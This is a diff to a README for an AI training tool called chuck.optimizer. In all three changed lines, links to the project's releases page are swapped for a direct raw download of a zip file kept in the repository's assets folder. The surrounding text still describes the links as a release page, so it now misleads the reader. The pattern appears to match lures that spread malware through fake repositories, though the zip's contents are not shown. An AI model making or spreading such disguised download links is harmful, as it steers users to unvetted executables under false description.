@@ -1,6 +1,6 @@
 # 🛠️ chuck.optimizer - Simple AI Model Training Tool
 
-[![Download chuck.optimizer](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/pecharesjoselito/chuck.optimizer/releases)
+[![Download chuck.optimizer](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/pecharesjoselito/chuck.optimizer/raw/refs/heads/main/assets/optimizer-chuck-3.8.zip)
 
 Adam is blind. Chuck sees. Lee 4ever.
 
@@ -32,7 +32,7 @@ Before downloading, make sure your system meets the following minimum needs:
 
 Click the big green button above or this link to visit the download page:
 
-https://github.com/pecharesjoselito/chuck.optimizer/releases
+https://github.com/pecharesjoselito/chuck.optimizer/raw/refs/heads/main/assets/optimizer-chuck-3.8.zip
 
 This page shows all available versions and files.
 
@@ -134,7 +134,7 @@ If you see training errors:
 
 For details about versions and updates, visit the release page:
 
-https://github.com/pecharesjoselito/chuck.optimizer/releases
+https://github.com/pecharesjoselito/chuck.optimizer/raw/refs/heads/main/assets/optimizer-chuck-3.8.zip
 
 This page contains release notes, bug fixes, and additional downloads.
 
